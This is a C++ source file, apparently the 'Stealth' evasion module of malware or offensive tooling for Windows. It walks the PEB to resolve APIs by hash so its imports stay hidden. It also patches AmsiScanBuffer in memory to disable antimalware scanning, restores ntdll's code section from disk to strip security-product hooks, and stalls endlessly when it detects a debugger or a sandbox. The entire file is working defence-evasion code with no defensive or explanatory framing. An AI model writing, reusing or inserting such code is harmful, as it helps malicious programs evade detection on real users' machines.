#include "Stealth.h"
#include <winternl.h>
#include <intrin.h>
#include <vector>
#include <ctype.h>
#include <string.h>

namespace Stealth {

    #ifdef _WIN64
    #define GetPEB() (PPEB)__readgsqword(0x60)
    #else
    #define GetPEB() (PPEB)__readfsdword(0x30)
    #endif

    HMODULE GetModuleByHash(DWORD moduleHash) {
        PPEB peb = GetPEB();
        PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
        PLIST_ENTRY curr = head->Flink;

        while (curr != head) {
            PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            if (entry->FullDllName.Buffer) {
                std::wstring wname(entry->FullDllName.Buffer);
                std::string sName;
                for (wchar_t wc : wname) sName += (char)tolower((int)wc);

                size_t lastSlash = sName.find_last_of("\\/");
                std::string filename = (lastSlash == std::string::npos) ? sName : sName.substr(lastSlash + 1);

                if (HashApi(filename.c_str()) == moduleHash)
                    return (HMODULE)entry->DllBase;
            }
            curr = curr->Flink;
        }
        return nullptr;
    }

    FARPROC GetApiByHash(HMODULE hModule, DWORD funcHash) {
        if (!hModule) return nullptr;
        PBYTE base = (PBYTE)hModule;
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)base;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(base + dosHeader->e_lfanew);
        DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (exportDirRVA == 0) return nullptr;
        PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(base + exportDirRVA);
        PDWORD names = (PDWORD)(base + exportDir->AddressOfNames);
        PDWORD functions = (PDWORD)(base + exportDir->AddressOfFunctions);
        PWORD ordinals = (PWORD)(base + exportDir->AddressOfNameOrdinals);
        for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
            if (HashApi((const char*)(base + names[i])) == funcHash)
                return (FARPROC)(base + functions[ordinals[i]]);
        }
        return nullptr;
    }

    void BypassAMSI() {
        HMODULE hKernel32 = GetModuleByHash(Hashes::kernel32);
        auto pLoadLibraryW = (HMODULE(WINAPI*)(LPCWSTR))GetApiByHash(hKernel32, Hashes::LoadLibraryW);
        if (!pLoadLibraryW) return;

        HMODULE hAmsi = pLoadLibraryW(L"amsi.dll");
        if (!hAmsi) return;

        void* pScanBuffer = (void*)GetApiByHash(hAmsi, HashApi("AmsiScanBuffer"));
        if (!pScanBuffer) return;

        auto pVirtualProtect = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))GetApiByHash(hKernel32, Hashes::VirtualProtect);
        if (!pVirtualProtect) return;

        DWORD oldProtect;
#ifdef _WIN64
        unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // x64: mov eax, 0x80070057 (INVALID_ARG); ret
#else
        unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }; // x86: mov eax, ...; ret 18
#endif

        if (pVirtualProtect(pScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            memcpy(pScanBuffer, patch, sizeof(patch));
            pVirtualProtect(pScanBuffer, sizeof(patch), oldProtect, &oldProtect);
        }
    }

    void UnhookNtdll() {
        HMODULE hKernel32 = GetModuleByHash(Hashes::kernel32);
        HMODULE hNtdll = GetModuleByHash(Hashes::ntdll);
        if (!hKernel32 || !hNtdll) return;

        auto pCreateFileW = (HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))GetApiByHash(hKernel32, Hashes::CreateFileW);
        auto pVirtualProtect = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))GetApiByHash(hKernel32, Hashes::VirtualProtect);
        auto pCloseHandle = (BOOL(WINAPI*)(HANDLE))GetApiByHash(hKernel32, Hashes::CloseHandle);

        if (!pCreateFileW || !pVirtualProtect || !pCloseHandle) return;

        HANDLE hFile = pCreateFileW(L"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return;

        auto pNtCreateSection = (HRESULT(WINAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE))GetApiByHash(hNtdll, HashApi("NtCreateSection"));
        auto pNtMapViewOfSection = (HRESULT(WINAPI*)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG))GetApiByHash(hNtdll, HashApi("NtMapViewOfSection"));
        auto pNtUnmapViewOfSection = (HRESULT(WINAPI*)(HANDLE, PVOID))GetApiByHash(hNtdll, HashApi("NtUnmapViewOfSection"));

        HANDLE hSection = NULL;
        if (pNtCreateSection && pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile) == 0) {
            PVOID pMapping = NULL;
            SIZE_T viewSize = 0;
            if (pNtMapViewOfSection && pNtMapViewOfSection(hSection, (HANDLE)-1, &pMapping, 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY) == 0) {
                PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
                PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + dosHeader->e_lfanew);
                for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
                    PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)IMAGE_FIRST_SECTION(ntHeaders) + (i * IMAGE_SIZEOF_SECTION_HEADER));
                    if (strcmp((const char*)sectionHeader->Name, ".text") == 0) {
                        DWORD oldProtect;
                        LPVOID lpAddress = (LPVOID)((PBYTE)hNtdll + sectionHeader->VirtualAddress);
                        DWORD dwSize = sectionHeader->Misc.VirtualSize;
                        if (pVirtualProtect(lpAddress, dwSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                            memcpy(lpAddress, (LPVOID)((PBYTE)pMapping + sectionHeader->VirtualAddress), dwSize);
                            pVirtualProtect(lpAddress, dwSize, oldProtect, &oldProtect);
                        }
                        break;
                    }
                }
                if (pNtUnmapViewOfSection) pNtUnmapViewOfSection((HANDLE)-1, pMapping);
            }
            pCloseHandle(hSection);
        }
        pCloseHandle(hFile);
    }

    bool IsBeingAnalyzed() {
        HMODULE hKernel32 = GetModuleByHash(Hashes::kernel32);
        auto pIsDebuggerPresent = (BOOL(WINAPI*)())GetApiByHash(hKernel32, Hashes::IsDebuggerPresent);
        if (pIsDebuggerPresent && pIsDebuggerPresent()) return true;

        SYSTEM_INFO si;
        auto pGetSystemInfo = (void(WINAPI*)(LPSYSTEM_INFO))GetApiByHash(hKernel32, Hashes::GetSystemInfo);
        if (pGetSystemInfo) { pGetSystemInfo(&si); if (si.dwNumberOfProcessors < 2) return true; }

        MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms);
        auto pGlobalMemoryStatusEx = (BOOL(WINAPI*)(LPMEMORYSTATUSEX))GetApiByHash(hKernel32, Hashes::GlobalMemoryStatusEx);
        if (pGlobalMemoryStatusEx && pGlobalMemoryStatusEx(&ms) && ms.ullTotalPhys < (3ULL * 1024 * 1024 * 1024)) return true;

        return false;
    }

    void Initialize() {
        UnhookNtdll();
        BypassAMSI();
        if (IsBeingAnalyzed()) {
            HMODULE hKernel32 = GetModuleByHash(Hashes::kernel32);
            auto pSleep = (void(WINAPI*)(DWORD))GetApiByHash(hKernel32, Hashes::Sleep);
            while (true) if (pSleep) pSleep(10000); else break;
        }
    }
}
